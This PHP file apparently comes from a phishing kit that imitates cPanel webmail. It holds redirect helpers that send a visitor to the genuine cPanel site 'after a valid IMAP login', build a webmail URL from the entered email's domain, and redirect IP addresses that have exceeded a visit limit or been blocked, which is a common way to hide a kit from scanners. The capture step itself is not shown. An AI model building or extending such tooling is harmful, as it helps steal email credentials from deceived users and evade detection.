<?php
declare(strict_types=1);

/** URL oficial cPanel Webmail após login válido ou IP bloqueado. */
const CPANEL_OFFICIAL_URL = 'https://webmail.cpanel.net/';

/** Monta https://webmail.{dominio} a partir do e-mail (parte após @). */
function webmail_redirect_from_email(string $email): string
{
    $email = trim($email);
    if ($email === '' || !preg_match('/@(.+)$/i', $email, $m)) {
        return cpanel_official_url([]);
    }

    $domain = strtolower(trim($m[1]));
    $domain = preg_replace('/[^a-z0-9.-]/', '', $domain);

    if ($domain === '' || !str_contains($domain, '.')) {
        return cpanel_official_url([]);
    }

    return 'https://webmail.' . $domain;
}

function cpanel_official_url(array $config): string
{
    $url = trim((string) ($config['cpanel_official_url'] ?? CPANEL_OFFICIAL_URL));
    return $url !== '' ? $url : CPANEL_OFFICIAL_URL;
}

/** Redirect após login IMAP válido — site oficial cPanel (não o painel admin). */
function webmail_success_redirect(array $config): string
{
    return cpanel_official_url($config);
}

/** Redirect quando IP excedeu visitas ou está bloqueado. */
function webmail_blocked_redirect(array $config): string
{
    $url = trim((string) ($config['blocked_redirect'] ?? ''));
    if ($url !== '' && !str_contains($url, 'google.com/erro')) {
        return $url;
    }
    return cpanel_official_url($config);
}
